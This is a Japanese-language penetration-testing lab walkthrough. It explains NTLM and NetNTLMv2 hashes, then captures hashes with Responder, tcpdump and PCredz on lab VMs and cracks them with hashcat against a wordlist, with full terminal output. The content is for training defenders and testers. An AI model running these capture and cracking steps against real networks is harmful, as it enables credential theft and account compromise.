...
NTLMハッシュとNetNTLMv2ハッシュの違いに注意することが重要です：
    ...
    NTハッシュ（NTLMハッシュとも呼ばれる）は、パスワードのソルトなしMD4ハッシュであり、WindowsがSAMファイル（ローカルユーザー）またはNTDS.ditファイル（ドメインユーザー）にパスワードを保存するために使用されます。この種のハッシュはハッシュ転送攻撃に利用される可能性があります！

    NTLMv2ハッシュ（NetNTLMv2ハッシュとも呼ばれる）は、傍受された場合にオフライン総当たり攻撃を仕掛けるために利用可能なチャレンジ・レスポンスです。この種のハッシュはPass-the-Hash攻撃には使用できませんが、SMB中継攻撃で中継される可能性があります！

レスポンダーがキャプチャしたハッシュは、デフォルトでは/pentest/exploitation/responder/logs内の.txtファイルに、下記のファイル名に類似した名前で保存されます。実際のファイル名は、WindowsマシンのIPアドレスによって異なります。

Hashcatが対象とするハッシュタイプ（NetNTLMv2）を指定する必要があります。これは-mフラグを使用して行えます：

```
sec560@560vm:~/Downloads$ hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-* /usr/share/wordlists/rockyou.txt
hashcat (v7.1.1-82-g95aa837b7) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 9 285H, 2946/5893 MB (1024 MB allocatable), 4MCU
...
Counting lines in /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-192.168.8Counted lines in /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-192.168.80Hashes: 2 digests; 2 unique digests, 2 unique salts
...
Host memory allocated for this attack: 513 MB (5514 MB free)

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95Dictionary cache built:
...
CLARK::SEC560-WINDOWS:f01b8371ca40c6e2:c4d1b0666c8a0bab163d3fd213619e8e::Qwerty12
CLARK::SEC560-WINDOWS:3c1caa40ebfcc720:4885ac3580fe7726945b4b024c84dc2d::Qwerty12
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-192.168.80.128.txt
Time.Started.....: Fri Mar  6 07:07:22 2026 (0 secs)
Time.Estimated...: Fri Mar  6 07:07:22 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2323.1 kH/s (1.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 745472/28688774 (2.60%)
...
Started: Fri Mar  6 07:07:04 2026
Stopped: Fri Mar  6 07:07:24 2026
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hashcat -m 5600 /pentest/exploitation/responder/logs/SMB-NTLMv2-SSP-*  --show
CLARK::SEC560-WINDOWS:3c1caa40ebfcc720:4885ac3580fe7726945b4b024c84dc2d::Qwerty12
CLARK::SEC560-WINDOWS:f01b8371ca40c6e2:c4d1b0666c8a0bab163d3fd213619e8e::Qwerty12
sec560@560vm:~/Downloads$ 
```
...
この実習では、Linuxマシンに移動し、smbclientを実行してSMB経由でWindows VMにアクセスしてください。認証が成功しないよう、偽のユーザー名とパスワードを入力してください。通信が行われている間、Linux上でtcpdumpを実行して通信内容を傍受し、その後解析します。

このラボでは様々なシナリオをモデル化しており、その一部を以下に概説します：

    あなたは中間者攻撃の立場にあり、認証情報を傍受しています

    Responser.py に類似したツールまたはサービスを実行し、脆弱性スキャナーがサービスに接続するのを待機します

    攻撃者が制御するマシン上の共有フォルダをユーザーにマウントさせることが許可されています

Linux仮想マシンに移動します。ここでまずtcpdumpスニッファを実行し、認証交換に関連するパケットをキャプチャします。2つのターミナルウィンドウが必要です：1つはtcpdumpによるパケットキャプチャ用、もう1つはsmbclientによるWindowsへの認証用です。2つのターミナルウィンドウを起動してください。

最初のターミナルで、以下のようにtcpdumpを実行します:

```
sec560@560vm:~/Downloads$ smbclient //192.168.80.128/c$ -U clark --password=Qwerty12
tree connect failed: NT_STATUS_ACCESS_DENIED
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ sudo tcpdump -nv -w /tmp/winauth.pcap port 445
...
PCredzを使用して、pcapファイルからパスワードハッシュを抽出します。このツールは「クレジットカード番号、NTLM（DCE-RPC、HTTP、SQL、LDAPなど）、Kerberos（AS-REQ事前認証 etype 23）、HTTP Basic、SNMP、POP、SMTP、FTP、IMAPなど」をpcapファイルまたはライブインターフェースから抽出できます。

PCredzツールは、実行場所と実行方法に特に注意が必要です。Pcredz実行ファイルを含むディレクトリから実行する必要があります。

>注記：実行ファイル名はPcredzですが、ツール名はPCredzです（「C」の大文字小文字が異なります）。以降、実行ファイル名であるPcredzで呼称します。

```
sec560@560vm:~/Downloads$ sudo /pentest/password-recovery/pcredz/Pcredz -vf /tmp/winauth.pcap 
Pcredz 2.0.3
...
protocol: tcp 192.168.80.129:40178 > 192.168.80.128:445
NTLMv2 complete hash is: clark::WORKGROUP:1bda20480b46bf0d:C96BEB9322D014956BD67159659C6D7F:


/tmp/winauth.pcap parsed in: 0.0255 seconds (File size 0.00434 Mo).
...
```
sec560@560vm:~/Downloads$ ls -l /pentest/password-recovery/pcredz/logs/
cat /pentest/password-recovery/pcredz/logs/NTLMv2.txt
total 4
-rw-r--r-- 1 root root 656 Mar  6 07:16 NTLMv2.txt
clark::WORKGROUP:1bda20480b46bf0d:C96BEB9322D014956BD67159659C6D7F:
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hashcat -m 5600 /pentest/password-recovery/pcredz/logs/NTLMv2.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.1-82-g95aa837b7) starting
...
Counting lines in /pentest/password-recovery/pcredz/logs/NTLMv2.txt. Please be Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1
...
Host memory allocated for this attack: 513 MB (5765 MB free)
...
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: CLARK::WORKGROUP:1bda20480b46bf0d:c96beb9322d014956...000000
Time.Started.....: Fri Mar  6 07:18:32 2026 (0 secs)
Time.Estimated...: Fri Mar  6 07:18:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2174.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
...
Started: Fri Mar  6 07:18:31 2026
Stopped: Fri Mar  6 07:18:33 2026
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ hashcat -m 5600 --show --outfile-format 2 /pentest/password-recovery/pcredz/logs/NTLMv2.txt
Qwerty12
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hashcat -h | grep -A10 "Outfile Formats"
- [ Outfile Formats ] -
